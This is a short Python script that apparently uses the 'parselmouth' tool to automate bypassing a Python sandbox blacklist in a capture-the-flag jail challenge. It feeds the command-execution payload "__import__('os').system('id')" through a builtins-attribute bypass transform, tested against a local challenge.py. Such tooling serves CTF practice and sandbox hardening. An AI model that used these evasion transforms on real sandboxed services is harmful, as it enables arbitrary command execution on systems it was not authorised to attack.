import ast
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))

import parselmouth as p9h

PAYLOAD = "__import__('os').system('id')"

def challenge_check(payload, ignore_space=False):
    if isinstance(payload, ast.AST):
        payload = ast.unparse(payload)
    payload = str(payload)

    if "Blacklisted" in subprocess.run(
        ["python3", "challenge.py"],
        input=payload+"\n",
        text=True,
        capture_output=True,
    ).stdout:
        return ["blocked"]

    return []

orig_check = p9h.check
p9h.check = challenge_check
transformed = p9h.P9H(
    PAYLOAD, specify_bypass_map={"black": {"Bypass_Name": ["by_builtins_attr"]}}, versbose=1
).visit()

print("\nbypassed:", transformed)
